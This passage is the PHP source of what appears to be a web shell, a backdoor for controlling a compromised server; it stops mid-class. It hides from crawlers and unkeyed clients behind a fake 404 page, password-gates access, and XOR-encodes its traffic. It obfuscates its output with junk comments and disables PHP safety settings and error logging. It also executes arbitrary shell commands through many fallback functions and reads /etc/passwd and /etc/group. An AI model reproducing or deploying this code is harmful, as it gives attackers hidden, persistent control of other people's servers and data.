<?php
$GLOBALS['HASHTYPE'] = 'sha512';
$GLOBALS['PASSHASH'] = 'dfbbeccfdcae9732e3d43697861efbe7bc56ffc746f07c3176a4594fc09977b747997d93cb65fb64ff093bc467e0ab35de3bc761efa29cb29a95c4df38375c26';//P@55w()rD
$GLOBALS['SECHEAD'] = 'USER_AGENT';
$GLOBALS['COOKIE'] = true;
$GLOBALS['DARK'] = false;
$GLOBALS['REMOTE_ADDR'] = true;
$GLOBALS['ACECONF'] = array('URL' => 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.14.0/ace.js', 'MODE' => 'php', 'THEME' => 'dreamweaver');
$GLOBALS['DEBUG'] = (isset($GLOBALS['DEBUG']) ? $GLOBALS['DEBUG'] : false);

filterClient();
decodeRequest();
checkAuth();

function checkAuth(){
	if(!$GLOBALS['PASSHASH']) return setEncKey();

	$loginWithPass = (isset($_REQUEST['pass']) && hash($GLOBALS['HASHTYPE'], $_REQUEST['pass']) === $GLOBALS['PASSHASH']);
	$encKeyWithPass = ($GLOBALS['ENCKEY'] === genEncKey($GLOBALS['PASSHASH']));

	if($loginWithPass)
		setEncKey($GLOBALS['PASSHASH']);
	elseif($encKeyWithPass)
		setEncKey();
	else
		loginFormOut();
}

function getEncKey(){
	$len = $GLOBALS['PRELEN'];
	
	foreach($_REQUEST as $k => &$v){
		$pref = strrev(substr($k, 0, $len));
		$post = substr($k, $len, $len);
		if($pref === $post){
			$eKey = $v;
			unset($_REQUEST[$k]);
			$GLOBALS['ENCKEY'] = base64_decode($eKey);
			return $GLOBALS['ENCKEY'];
		}
	}
	
	return false;
}

function genEncKey($str){
	return base64_encode(hash($GLOBALS['HASHTYPE'], ($GLOBALS['REMOTE_ADDR'] ? $_SERVER['REMOTE_ADDR'] : '').$str.__FILE__));
}

function setEncKey($pass = ''){
	if(!$pass && $GLOBALS['ENCKEY']) return $GLOBALS['ENCKEY'];
	$eKey = genEncKey($pass);
	$GLOBALS['ENCKEY'] = $eKey;
	return $eKey;
}

function decodeRequest(){
	$_REQUEST = array_merge($_FILES, $_COOKIE, $_REQUEST); unset($_GET, $_POST, $_COOKIE);
	$GLOBALS['PRELEN'] = getPreLen();
	if(!$GLOBALS['ENCKEY'] = getEncKey()) $GLOBALS['ENCKEY'] = setEncKey();
	$_REQUEST = decodeInput($_REQUEST);
}

function getPreLen(){
	return (substr(array_sum(str_split(hash($GLOBALS['HASHTYPE'], __FILE__))), -1) + 5);
}

function filterClient(){
	$secretHeader = isset($_SERVER['HTTP_'.$GLOBALS['SECHEAD']]);
	$crawlerBot = preg_match('/bot|crawl|spider/i', $_SERVER['HTTP_USER_AGENT']);
	if($crawlerBot || !$secretHeader) exit(header('HTTP/1.1 404 Not Found'));
}

function loginFormOut(){
	$html = '<html><head><meta name="robots" content="noindex"></head><body style="background:#f0f0f0;display:grid;height:100vh;margin:0;place-items:center center;"><form action="" method="POST" onsubmit="return login(this)"><input style="text-align: center" name="pass" type="password" value=""></form></body>'.paramsHandlerJS().'</html>';
	exit(makeOut($html));
}

function scriptInit(){
	if(!isset($GLOBALS['DEBUG'])) return;
	define('D', $GLOBALS['DEBUG']);
	set_time_limit(D ? 15 : 0);
	error_reporting(D ? E_ALL : 0);
	ini_set('display_errors', D ? 'On' : 'Off');
	ini_set('max_execution_time', D ? 15 : 0);
	ini_set('error_log', NULL);
	ini_set('log_errors', 0);
}

function decodeInput(&$arr){
	$str = '';
	foreach($arr as $k => $v){
		$key = getName($k);
		if(!strlen($key)) continue;
		$str .= $key.'='.urlencode(getValue($v)).'&';
		unset($arr[$k]);
	}
	parse_str($str, $dec);
	return array_merge($arr, $dec);
}

function xorStr($str, $decode = false) {
	$key = $GLOBALS['ENCKEY'];
    $key_len = strlen($key);
    $str = (!$decode ? rawurlencode($str) : $str);
    for($i = 0; $i < strlen($str); $i++)
        $str[$i] = $str[$i] ^ $key[$i % $key_len];
    $str = ($decode ? rawurldecode($str) : $str);
    return $str;
}

function ascii2hex($ascii) {
	$hex = '';
	for ($i = 0; $i < strlen($ascii); $i++) {
		$byte = strtoupper(dechex(ord($ascii[$i])));
		$byte = str_repeat('0', 2 - strlen($byte)).$byte;
		$hex.=$byte;
	}
	return $hex;
}

function hex2ascii($hex){
	$ascii='';
	$hex=str_replace(" ", "", $hex);
	for($i=0; $i<strlen($hex); $i=$i+2)
		$ascii.=chr(hexdec(substr($hex, $i, 2)));
	return($ascii);
}

function setName($str){
	$str = ascii2hex(xorStr($str));
	$pref = substr($GLOBALS['ENCKEY'], 0, $GLOBALS['PRELEN']);
	return $pref.$str;
}

function getName($str){
	$data = getData($str);
	if($data === false) return false;
	return xorStr(hex2ascii($data), true);
}

function setValue($str){
	return base64_encode(xorStr($str));
}

function getValue($str){
	return xorStr(base64_decode($str), true);
}

function getData($str){
	$ln = $GLOBALS['PRELEN'];
	$pref = substr($str, 0, $ln);
	$data = substr($str, $ln);
	return ($pref === substr($GLOBALS['ENCKEY'], 0, $ln) ? $data : false);
}

function genJunk($min = 10, $max = 100){
	$rand = '';
	$repeat = rand($min, $max);
	while(!isset($rand[$repeat])) $rand .= chr(rand(1, 127));
	if(rand(1,2) == 1)
		return '//'.str_replace(array("\r","\n"), "", $rand)."\n";
	else
		return '/*'.str_replace('*/','', $rand).'*/';
}

function paramsHandlerJS(){
	return '<script>
		var ENCKEY = atob("'.base64_encode($GLOBALS['ENCKEY']).'");
		var PRELEN = '.$GLOBALS['PRELEN'].';
		var COOKIE = '.(int)$GLOBALS['COOKIE'].';

		'.($GLOBALS['DARK'] ? 'invertColors();' : '').'
		startEventsListners();
		if(COOKIE){
			if(ci = document.getElementById("cbCO"))
				ci.checked = "on";
			deleteAllCookies();
		}

		function startEventsListners(){
			var elements = document.getElementsByTagName("*");
		
			for(var i=0;i<elements.length;i++){

				if(elements[i].type && elements[i].type == "file")
						elements[i].onchange = function(e){
							if(!elmById("cbRR").checked) prepareFile(this)
							else uplFiles();
						}
					
			}
		}
				
		function bin2hex(bin){
		  var hex = "";
		  for(var i = 0; i<bin.length; i++){
		    var c = bin.charCodeAt(i);
		    if (c>0xFF) c -= 0x350;
		    hex += (c.toString(16).length === 1 ? "0" : "") + c.toString(16);
		  }
		  return hex;
		}
		
		function login(form){
			addEncKey(form);
			form.pass.value = setValue(form.pass.value);
			form.pass.name = setName(form.pass.name);
			
			if(COOKIE)
				submitViaCookie(form);
			else
				return true;
				
			return false;
		}
		  
		function hex2bin(hex) {
		  var bin = "";
		  for (var i=0; i<hex.length; i=i+2) {
		    var c = parseInt(""+hex[i]+hex[i+1], 16);
		    if (c>0x7F) c += 0x350;
		    bin += String.fromCharCode(c);
		  }
		  return bin;
		}
			
		function xorStr(str, decode = false) {
			str = (!decode ? encodeURIComponent(str) : str);
			str = str.split("");
		    key = ENCKEY.split("");
		    var str_len = str.length;
		    var key_len = key.length;
		
		    var String_fromCharCode = String.fromCharCode;
		
		    for(var i = 0; i < str_len; i++) {
		        str[i] = String_fromCharCode(str[i].charCodeAt(0) ^ key[i % key_len].charCodeAt(0));
		    }
		    str = str.join("");
		    
		    if(decode){ 
				try{
					str = decodeURIComponent(str);
				}
				catch(e){
					str = unescape(str);
				}
			}

		    return str;
		}
		
		function setName(str){
			str = bin2hex(xorStr(str));
			pref = ENCKEY.substr(0, PRELEN);
			return pref + str;
		}
		
		function setValue(str){
			return btoa(xorStr(str));
		}
		
		function getValue(str){
			return xorStr(atob(str), true);
		}
		
		function addEncKey(form){
			var encKey = document.createElement("input");
			encKey.type = "hidden";
			pref = ENCKEY.substr(0, PRELEN);
			encKey.name = pref.split("").reverse().join("") + pref;
			encKey.value = btoa(ENCKEY);
			form.appendChild(encKey);
			return form;
		}
		
		function fixFileName(str, len = false){
			str = str.split(/(\\\\|\\/)/g).pop();
			if(len) str = str.substring(0, len);
			return str;
		}
		
		function getParentFormOf(element){
			
			while(element.tagName != "FORM")
				element = element.parentElement;

			return element;
		}
		
		function prepareFile(input){
			var file = input;
			form = getParentFormOf(input);
			form.enctype = "application/x-www-form-urlencoded";
			
			if(file.files.length){
				var reader = new FileReader();
				
				reader.onload = function(e){
						filename = fixFileName(input.value);
						wwwFile = document.createElement("input");
						wwwFile.type = "hidden";
						wwwFile.id = input.name;
						wwwFile.name = input.name + "["+filename+"]";
						wwwFile.value = e.target.result;
						if(e.target.result.length <= 2097152)
							form.appendChild(wwwFile);
						else
							if(confirm("Request size is ~" + Math.round(((e.target.result.length * 2) / 1024) / 1024) + "M, but limits is often around <= 8M. There is no guarantee that the file will be uploaded.\nYou can disable request encoding, use other upload methods or select a smaller file. Continue?"))
								form.appendChild(wwwFile);
							else
								return false;
							
						uplFiles();
						
						elements = form.getElementsByTagName("*");
						for(var i = 0; i < elements.length; i++)
							if(elements[i].type === "hidden")
								form.removeChild(elements[i]);
				};
				
				reader.readAsDataURL(file.files[0]);
				return reader;
			}
			
		}

		function deleteAllCookies() {	
			var cookies = document.cookie.split(";");
		
			for (var i = 0; i < cookies.length; i++) {
				var cookie = cookies[i];
				var eqPos = cookie.indexOf("=");
				var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
				document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
			}
			
			return false;
		}
	
		function submitViaCookie(encodedForm, refresh = true){
			var reqlen = 0;
			var elements = encodedForm.getElementsByTagName("*");
			
			for(i = 0; i < elements.length; i++) {
				
				if(!elements[i].name) continue;
				
				name = elements[i].name;
				value = encodeURIComponent(elements[i].value);

				if(value.length > 4095 || reqlen > 7696){
					if(confirm("The request header is too big, send it via POST?")){
						deleteAllCookies();
						return false;
					}
					else{
						deleteAllCookies();
						return "CANCEL";
					}
				}
				
				document.cookie =  name + "=" + value;
				reqlen = reqlen + name.length + value.length;
			}
			
			if(refresh)
				window.location = window.location.pathname;
			else
				return "SEND";
		}
		
		function invertColors() {
		    var css = "html{-webkit-filter: invert(90%); -moz-filter: invert(90%); -o-filter: invert(90%); -ms-filter: invert(90%);}";
		    var head = document.getElementsByTagName("head")[0];
		    var style = document.createElement("style");
		    if(!window.counter)
		        window.counter = 1;
		    else{
		        window.counter++;
		        if (window.counter % 2 == 0)
		            var css = "html{-webkit-filter: invert(0%); -moz-filter: invert(0%); -o-filter: invert(0%); -ms-filter: invert(0%);}"
		    }
		    style.type = "text/css";
		    
		    if(style.styleSheet)
		        style.styleSheet.cssText = css;
		    else
		        style.appendChild(document.createTextNode(css));
		        
		    head.appendChild(style);
		    
		    return false;
		}
</script>';
}

function j(){
	return genJunk(100, 300);
}

function makeOut($str){
	print('<script>'.t('document.write(decodeURIComponent(atob(('.implode('+', array_map(function($k){return '"'.$k.'"';}, str_split(strrev(base64_encode(rawurlencode($str))), rand(200, 500)))).').split("").reverse().join(""))));', true).'</script>');
}

function t($s, $n = false){
	$s = ($n ? '<?php ' : '').$s;
	
	foreach(token_get_all($s) as $t)
		@$r .= (is_array($t) ? $t[1] : $t).j();
	
	return ($n ? substr($r, 6) : $r);
}

function sDie($str = ''){
	if(RO)
		die($str);
	else{
		$out = ob_get_contents();
		ob_end_clean();
	}
	
	if(preg_grep('|attachment|', headers_list())) print gzencode($out.$str, 9);
	else
		print setValue($out.$str);
	die;
}

#
#
#

$ini = array(
	'disable_classes' => '',
	'disable_functions' => '',
	'display_errors' => 0,
	'enable_post_data_reading' => 1,
	'error_log' => '',
	'error_reporting' => 0,
	'file_uploads' => 1,
	'log_errors' => 0,
	'log_errors_max_len' => -1,
	'magic_quotes_gpc' => 0,
	'magic_quotes_runtime' => 0,
	'magic_quotes_sybase' => 0,
	'max_execution_time' => 0,
	'memory_limit' => '1024M',
	'open_basedir' => '',
	'safe_mode' => 0,
	'safe_mode_exec_dir' => '');

$sysini = ini_get_all();
	foreach($ini as $k => $v)
		if(isset($sysini[$k]) && $sysini[$k]['access'] == 7)
			ini_set($k, $v);
	
scriptInit();

function unQuote($a){
	foreach($a as $k => $v)
		if(is_array($v))
			$a[$k] = unQuote($v);
		else
			$a[$k] = stripslashes($v);
			return $a;
}
	
function prepVals(&$a,$k){
	foreach($a as $i => $v)
		if(is_array($v)) prepVals($a[$i],$k);
		elseif(strlen($v)>2){
			$r = '';
			$v = explode($k, $v);
			for($n = count($v)-1; $n>=0; --$n){
				$c = array_pop($v);
				if($c === '')
					$c = $k;
				if($n%2 === 0)
					$r .= $c;
				else
					$r = $c.$r;
			}
			$a[$i]=$r;
		}
}

if(defined('CED'))
	$D = unserialize(pack('H*', CED));
else{
	if(isset($_REQUEST['a']))
		$D=$_REQUEST;
	elseif(isset($_REQUEST['a']))
		$D=$_REQUEST;
	else
		$D=array();
		
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc())
		$D = unQuote($D);
	
	if(isset($D['k'])){
		$k = $D['k'];
		unset($D['k']);
		prepVals($D,$k);
	}
}

$C = array(''=>'UTF-8','UTF-16','Windows-1250','Windows-1251','Windows-1252','Windows-1254','Windows-1256','Windows-1257','ISO-8859-1','ISO-8859-2','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-13','Big5','GBK','Shift_JIS','EUC-KR','EUC-JP','IBM866','KOI8-R','KOI8-U',);

define('VER', '1.1');
define('DSC', DIRECTORY_SEPARATOR);
define('NIX', DSC === '/');
define('RO', isset($D['ro']) ? true : false);
define('TM', isset($D['tm']) ? true : false);
define('CSE', isset($D['c']) ? $C[$D['c']]:'UTF-8');

ob_end_clean();
if(!RO) ob_start();

if(!defined('CED')){
	if(isset($D['a'])){
		$md5 = md5(rand(0, 777777));
		if(isset($D['d'])){
			if($D['a']==='f'){
				if(is_array($D['d'])){
						$D['DBP'] = samePath($D['d']);
						$n = $md5.'.zip';
					}
					elseif(is_dir($D['d']))
						$n = $md5.'.zip';
					else
						$n = fileName($D['d']);
						$n = escFileName($n);
			}
			else
				$n = $md5.'.zip';
				
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="'.$n.(RO ? '' : '.gz').'"');
		}
		else{
			header('Content-Type: application/json; charset='.CSE);
		}
	}
	else
		header('Content-Type: text/html; charset='.CSE);		
}
					
function escHTML($v){
	return str_replace(array('&','"','<','>'), array('&amp;','&quot;','&lt;','&gt;'), $v);
}

function selfPath(){
	if(isset($_SERVER['SCRIPT_FILENAME'])) return filePath($_SERVER['SCRIPT_FILENAME']);
	if(isset($_SERVER['DOCUMENT_ROOT'])) return substr($_SERVER['DOCUMENT_ROOT'],-1) === DSC ? $_SERVER['DOCUMENT_ROOT'] : $_SERVER['DOCUMENT_ROOT'].DSC;
	if(PHP_VERSION >= '5.3') return substr(__DIR__,-1) === DSC ? __DIR__ : __DIR__.DSC;
	return filePath(__FILE__);
}

function filePath($p){
	$p = rtrim($p, DSC);
	return implode(DSC, array_slice(explode(DSC,$p), 0, -1)).DSC;
}

function fileName($p){
	$p=rtrim($p, DSC);
	$i=strrpos($p, DSC);
	return $i=== FALSE ? $p : substr($p,$i+1);
}

function writeFile($p,$c){
	if($v = fopen($p,'wb')){
		flock($v,LOCK_EX);
		fwrite($v,$c);
		fflush($v);
		flock($v,LOCK_UN);
		fclose($v);
		return TRUE;
	}

	if(PHP_VERSION>='5'){
		$v = file_put_contents($p,$c);
		if(is_int($v)) return TRUE;
	}

	if(PHP_VERSION>='5') : if(PHP_VERSION>='5.1'){
		try{
			$v = new SplFileObject($p,'wb');
		}
		catch(Exception $e ){
			$v=FALSE;
		}
	
		if($v){
			$v->flock(LOCK_EX);
			$v->fwrite($c);
			$v->fflush();
			$v->flock(LOCK_UN);
			unset($v);
			return TRUE;
		}
	}
	endif;
	
	return FALSE;
}

function tempName(){
	$a = 'poiuytrewqlkjhgfdsamnbvcxzMNBVCXZLKJHGFDSAPOIUYTREWQ0987654321';
	$v = '.';
	for($i = 0; $i < 8; ++$i) $v .= $a[rand(0,61)];
	return $v.'.tmp';
}

function tempFile($v){
	if(($n = tempnam(NIX ? '/tmp' : 'c:\\Temp', '')) && (writeFile($n, $v))) return $n;
	$a = array('upload_tmp_dir','session.save_path','user_dir','doc_root');
	
	foreach($a as $k)
		if($n = ini_get($k)){
			$n .= DSC.tempName();
			if(writeFile($n, $v)) return $n;
		}
		
		$n = selfPath().tempName();
		
		if(writeFile($n, $v)) return $n;
	
	return FALSE;
}

function getFile($p){
	$v = NULL;
	
	if($v = fopen($p,'rb')){
		$r = '';
		while(!feof($v)) $r .= fread($v, 1048576);
		fclose($v);
		return $r;
	}
	
	if(PHP_VERSION >= '4.3'){
		$v = file_get_contents($p);
		if(is_string($v)) return $v;
	}
	
	$v = file($p);
	if(is_array($v)) return implode('',$v);
	
	if(PHP_VERSION>='5') : if(PHP_VERSION>='5.1'){
		try{
			$v = new SplFileObject($p,'rb');
		}
		catch(Exception $e){
			$v = FALSE;
		}
	
		if($v){
			$r = '';
			while(!$v->eof()) $r .= $v->fgets();
			unset($v);
			return$r;
		}
	}
	endif;
	
	if(RO && defined('FORCE_GZIP')){
		if($v = gzopen($p)){
			$r='';
			while(!gzeof($v)) $r .= gzread($v, 1048576);
			gzclose($v);
			return $r;
		}
		$v = gzfile($p);
		if(is_array($v)) return implode('',$v);
	}
	
	if(RO && $v=ob_start()){
		if(is_int(readfile($p)) || copy($p, 'php://output') || (defined('FORCE_GZIP') && is_int(readgzfile($p)))){
			$r = ob_get_contents();
			ob_end_clean();
			return $r;
		}
		ob_end_clean();
	}
	
	return FALSE;
}

function delFile($p){
	return (unlink($p) || (NIX && rename($p,'/dev/null') && !is_file($p) && !file_exists($p)));
}

function nesc($v){
	return "'".str_replace("'", '\'"\'"\'', $v)."'";
}

function wesc($v){
	return str_replace(array('^', '&', '\\', '<', '>', '|'), array('^^', '^&', '^\\', '^<', '^>', '^|'), $v);
}

function exe($cmd, $fnc, $sh = '', $se = TRUE, $or = '') {
	$se = '2>' . ($se ? '&1' : (NIX ? '/dev/null' : 'nul')) . $or;
	if (NIX)
		$sc = 'echo ' . nesc($cmd) . '|' . ($sh === '' ? '$0' : $sh) . ' ' . $se . ' & exit';
	else
		$sc = ($sh === '' ? '(' . $cmd . ')' : $sh . ' /C ' . wesc($cmd) . ' ') . $se;
	switch ($fnc) {
		case 0:
			system($sc);
			break;
		case 1:
			passthru($sc);
			break;
		case 2:
			echo `$sc`;
			break;
		case 3:
			echo shell_exec($sc);
			break;
		case 4:
			$r = NULL;
			exec($sc, $r);
			if (is_array($r))
				foreach ($r as $v)
					echo $v, "\n";
			break;
		case 5:
			if ($h = popen($sc, 'r')) {
				while (!feof($h))
					echo fread($h, 1024);
				pclose($h);
			}
			break;
		case 6:
			if($h = proc_open($sc,array(array('pipe','r'), array('pipe','w'), array('pipe','a')),$p)){
				echo stream_get_contents($p[1]);
				fclose($p[0]);
				fclose($p[1]);
				proc_close($h);
			}
		case 7:
			if ($h = fopen('expect://' . $sc, 'r')) {
				while (!feof($h))
					echo fread($h, 1024);
				fclose($h);
			}
			break;
		case 8:
			if ($h = expect_popen($sc)) {
				while (!feof($h))
					echo fread($h, 1024);
				fclose($h);
			}
			break;
		case 10:
			if ($h = new COM('WScript.Shell'))
				echo $h->Exec(($sh === '' ? 'cmd' : $sh) . ' /C ' . $cmd . ' ' . $se)->StdOut->ReadAll();
			break;
	}
}


function uName($id){
	if($id === -1) return'?';
	
	static $a = NULL, $f = FALSE;
	
	if($a === NULL){
		if($v = getFile('/etc/passwd')){
			$a = array();
			$v = explode("\n", $v);
			foreach($v as $i)
				if($i){
					$i = explode(':',$i,4);
					$a[$i[2]]=$i[0];
				}
		}
		elseif(defined('POSIX_F_OK') || function_exists('posix_getpwuid'))
			$f = (bool)posix_getpwuid(0);
	}
	
	if($a)
		if(isset($a[$id])) return $a[$id];
	elseif($f)
		if($v = posix_getpwuid($id)) return $v['name'];
	
	return $id;
}

function gName($id){
	if($id === -1) return'?';
	
	static $a = NULL, $f = FALSE;
	
	if($a === NULL){
		if($v = getFile('/etc/group')){
			$a = array();
			$v = explode("\n",$v);
			foreach($v as$i)
				if($i){
					$i = explode(':', $i, 4);
					$a[$i[2]] = $i[0];
				}
		}
		elseif(defined('POSIX_F_OK') || function_exists('posix_getgrgid')) $f = (bool)posix_getgrgid(0);
	}

	if($a)
		if(isset($a[$id])) return $a[$id];
	elseif($f)
		if($v = posix_getgrgid($id)) return $v['name'];
	
	return$id;

}

function getINI($s, &$v){
	$v = trim(ini_get($s));
	return $v!=='';
}

function isINI($v){
	$v = strtolower(trim(ini_get($v)));
	return ($v === '1' || $v === 'on');
}

function samePath($a){
	$p = NULL;
	foreach($a as $v){
		$v = array_slice(explode(DSC, rtrim($v,DSC)), 0, -1);
		if($p === NULL) $p = $v;
		else{
			$k=array();
			$c=count($p);
			$i=count($v);
			if($i < $c) $c=$i;
			for($i=0; $i < $c; ++$i)
			if($p[$i] === $v[$i]) $k[] = $p[$i];
			else
				break;
			$p = $k;
			if($i===0) break;
			}
	}
	
	return count($p) === 0 ? '': implode(DSC, $p).DSC;
}

function escFileName($v){
	return str_replace(array('%','/','\\',':','*','?','"','<','>','|'), array('%25',"\xe2\x95\xb1","\xe2\x95\xb2","\xea\x9e\x89","\xe2\x88\x97", '%3F', "\xe2\x80\x9f", '%3C', '%3E',"\xe2\x88\xa3"), $v);
}

function infMain($h = FALSE){
	echo $h ? '<table id="tblInf"><tr title="HTTP Host, Server Addr, Server Name, Host Name, Host IP"><th>' : '[{"','Address', $h ? '</th><td>' : '":';
	$a = array();
	
	foreach(array('HTTP_HOST','SERVER_ADDR','SERVER_NAME') as $v)
		if(isset($_SERVER[$v])){
			$v = trim($_SERVER[$v]);
			if($v!==''&&!in_array($v,$a))$a[]=$v;
		}
		
		if($v = php_uname('n')){
			$v = trim($v);
			if($v !== '' && !in_array($v,$a)) $a[] = $v;
		}
		
		if(PHP_VERSION>='5.3' && ($v = gethostname())){
			$v = trim($v);
			if($v !== '' && !in_array($v,$a)) $a[] = $v;
		}
		
		$r='';
		foreach($a as $k => $v){
			if($k > 0) $r.=' / ';
			$r .= $v;
			if($i=gethostbynamel($v)){
				$b = FALSE;
				foreach($i as $v)
					if(!in_array($v, $a)){
						$a[] = $v;
						if($b) $r .= ', ';
						else{$b = TRUE; $r .= ' (';} $r .= $v;
					}
					
					if($b) $r .= ')';
			}
			elseif(($i = gethostbyname($v)) && !in_array($v, $a)){
				$a[] = $v;
				$r .= ' ('.$v.')';
			}
		}
		
		if($h) echo escHTML($r);
		else jsonEcho($r);
		
		echo $h ? '</td></tr><tr><th>' : ',"','System', $h ? '</th><td>' : '":';
		
		$r = '';
		if(($v = trim(php_uname('s').' '.php_uname('r').' '.php_uname('v').' '.php_uname('m'))) !== '') $r = $v;
		elseif(NIX && ($v = getFile('/proc/version'))) $r = $v;
		else{
			if(defined('PHP_OS')) $r = PHP_OS;
			else $r = NIX ? '*NIX' : 'Windows';
			
			if(!NIX){
				$a = array();
				foreach(array('PHP_WINDOWS_VERSION_MAJOR','PHP_WINDOWS_VERSION_MINOR','PHP_WINDOWS_VERSION_BUILD') as $v) if(defined($v)) $a[] = constant($v);
				
				if($a) $r .=' '.implode('.', $a);
				if(defined('PHP_WINDOWS_VERSION_SP_MAJOR') && PHP_WINDOWS_VERSION_SP_MAJOR > 0){
					$r .= ' SP'.PHP_WINDOWS_VERSION_SP_MAJOR;
					if(defined('PHP_WINDOWS_VERSION_SP_MINOR') && PHP_WINDOWS_VERSION_SP_MINOR > 0) $r .= '.'.PHP_WINDOWS_VERSION_SP_MINOR;
				}
			}
		}
		
		if(NIX && (($v = trim(getFile('/etc/issue.net'))) !== '' || ($v = trim(getFile('/etc/issue'))) !== '')) $r .= ' ('.$v.')';
		
		if($h)
			echo escHTML($r);
		else
			jsonEcho($r);
		
		if(!empty($_SERVER['SERVER_SOFTWARE'])){
			echo $h ?'</td></tr><tr><th>' : ',"','Server', $h ? '</th><td>':'":';
			if($h)
				echo escHTML($_SERVER['SERVER_SOFTWARE']);
			else
				jsonEcho($_SERVER['SERVER_SOFTWARE']);
		}
		
		echo $h ? '</td></tr><tr><th>' : ',"','Software', $h ? '</th><td>' : '":';
		
		$r = 'PHP/'.PHP_VERSION;
		
		if(defined('SUHOSIN_PATCH_VERSION')) $r .= ' with Suhosin patch/'.SUHOSIN_PATCH_VERSION;
		
		$r .= '; ';
		if(defined('CURLE_OK')){
			$r .= 'cURL';
			$v = curl_version();
			if(isset($v['version'])) $r.='/'.$v['version'];
			$r.='; ';
		}
		
		if($v = phpversion('Suhosin')) $r.=' Suhosin/'.$v;
		
		if($h)
			echo escHTML($r);
		else
			jsonEcho($r);
			
		echo $h ? '</td></tr><tr><th>' : ',"','User', $h ? '</th><td>' : '":';
		
		$r='';
		$a = array();
		if(NIX){
			if(defined('POSIX_F_OK') || function_exists('posix_geteuid')){
				if(is_int($v = posix_geteuid())) $r .= 'euid='.$v.'('.uName($v).'); ';
				if(is_int($v = posix_getegid())) $r .= 'egid='.$v.'('.gName($v).'); ';
			}
			
			if(is_int($v = getmyuid())) $r .= 'ouid='.$v.'('.uName($v).'); ';
			if(is_int($v = getmygid())) $r .= 'ogid='.$v.'('.gName($v).'); ';
		}
		
		$b = FALSE;
		
		foreach(array('REMOTE_ADDR','HTTP_X_REAL_IP','HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR') as $i){
			if(!empty($_SERVER[$i])){
				if($b)
					$r.= ', ';
				else{
					$b = TRUE;
					$r .= 'IP: ';
				}
				
				$r .= $_SERVER[$i];
			}
		}
		
		if($b)
			$r .= ';';
		if($h)
			echo escHTML($r);
		else
			jsonEcho($r);
		
		echo $h ? '</td></tr><tr><th colspan="2"></th></tr><tr><th>':'},{"','Safe mode', $h ? '</th><td>' : '":';
		
		if(isINI('safe_mode')){
			$v = isINI('safe_mode_gid') ? 'GID':'UID';
			echo $h ? $v : '"'.$v.'"';
			foreach(array('Include dir' => 'safe_mode_include_dir','Exec dir' => 'safe_mode_exec_dir', 'Vars prefixes' => 'safe_mode_allowed_env_vars', 'Protected vars' => 'safe_mode_protected_env_vars') as $k => $v){
				if(!getINI($v, $v)) $v = '-';
				
				echo $h ? '</td></tr><tr><th>' : ',"', $k, $h?'</th><td>' : '":';
				if($h)
					echo escHTML($v);
				else
					jsonEcho($v);
			}
		}
		else
			echo $h ? '-' : '"-"';
		
		echo $h ? '</td></tr>' : '';
		foreach(array('Open basedir' => 'open_basedir', 'Disabled functions' => 'disable_functions', 'Disabled classes' => 'disable_classes') as $k => $v){
			if(!getINI($v, $v)) $v = '-';
			echo $h ? '<tr><th>' : ',"', $k, $h ? '</th><td>' : '":';
			if($h)
				echo escHTML($v),'</td></tr>';
			else
				jsonEcho($v);}
			
			if(getINI('suhosin.simulation', $v)){
				echo $h ? '<tr><th colspan="2"></th></tr><tr><th>' : '},{"', 'Suhosin mode', $h ? '</th><td>' : '":"', $v ? 'simulation' : 'break', $h ? '</td></tr><tr><th>' : '","','Allow rewrite', $h ? '</th><td>' : '":';
				
			if(!getINI('suhosin.perdir', $v) || !$v) $v = '-';
			
			if($h)
				echo escHTML($v),'</td></tr>';
			else jsonEcho($v);
			
			foreach(array('Functions whitelist' => 'suhosin.executor.func.whitelist', 'Functions blacklist' => 'suhosin.executor.func.blacklist', 'Eval whitelist' => 'suhosin.executor.eval.whitelist', 'Eval blacklist' => 'suhosin.executor.eval.blacklist') as $k => $v){
				if(!getINI($v, $v)) $v = '-';
				echo $h ? '<tr><th>' : ',"', $k, $h ? '</th><td>' : '":';
				if($h)
					echo escHTML($v),'</td></tr>';
				else jsonEcho($v);
			}
			
			$a = array('eval' => 'suhosin.executor.disable_eval', '/e modifier' => 'suhosin.executor.disable_emodifier');
			
			$i = array();
			foreach($a as$k => $v)
				if(isINI($v)) $i[] = $k;
				echo $h ? '<tr><th>' : ',"', 'Disabled', $h ?'</th><td>' : '":"', $i ? implode(', ', $i) : '-', $h ? '</td></tr>' : '"';
				if(isINI('suhosin.log.file') && getINI('suhosin.log.file.name', $v)){
					echo $h ? '<tr><th>' : ',"','Log file', $h ? '</th><td>' : '":';
					if($h)
						echo escHTML($v),'</td></tr>';
					else
						jsonEcho($v);
				}
		}
		
	echo $h ? '</table>' : '}]';
}


function parsePath($p, &$b, &$n){
	$v = rtrim($p, DSC);
	$i = strrpos($v,DSC);
	if($i === FALSE){
		if(!NIX && strlen($v) === 2 && $v[1] === ':'){
			$b = $v.DSC;
			$n = '';
		}
		else{
			$b = DSC;
			$n = $v;
		}
	}
	else{
		$b = substr($v,0,$i+1);
		$n = substr($v,$i+1);
	}
}


class FileInfo{
	
	function __construct($v){
		if(is_string($v)){
			$this->fb = '';
			$this->fn= '' ;
			
			parsePath($v, $this->fb, $this->fn);
			$this->fp = $this->fb.$this->fn;
		}
		else{
			$this->fi = $v;
			$this->fp = $v->getPathName();
			$this->fb = $v->getPath();
			$this->fn = $v->getFileName();
		}
		
		$this->rp = $this->fp;
		if($this->isLink()){
			$this->rp = $this->getLinkTarget();
			if(isset($this->t)) unset($this->t);
			if(isset($this->fi)) unset($this->fi);
		}
	}
	
	function getPath(){
		return$this->fb;
	}
	
	function getFileName(){
		return$this->fn;
	}
	
	function getPathName(){
		return$this->fp;
	}
	
	function isDir(){
		if(isset($this->d)) return$this->d;
		if(!isset($this->p)) $this->getPerms();
		if($this->p !== 0){
			$this->d = ($this->p & 0170000) === 0040000;
			return $this->d;
		}
		if(!isset($this->t)) $this->type();
		if($this->t !== FALSE){
			$this->d = $this->t === 'dir';
			return $this->d;
		}
		
		$v = is_dir($this->fp);
		if(is_bool($v)){
			$this->d = $v;
			return $v;
		}
		if(PHP_VERSION>='5') : if(!isset($this->fi)) $this->spl();
		if($this->fi !== FALSE){
			try{
				$v = $this->fi->isDir();
			}
			catch(Exception $e){
				$v = NULL;
			}
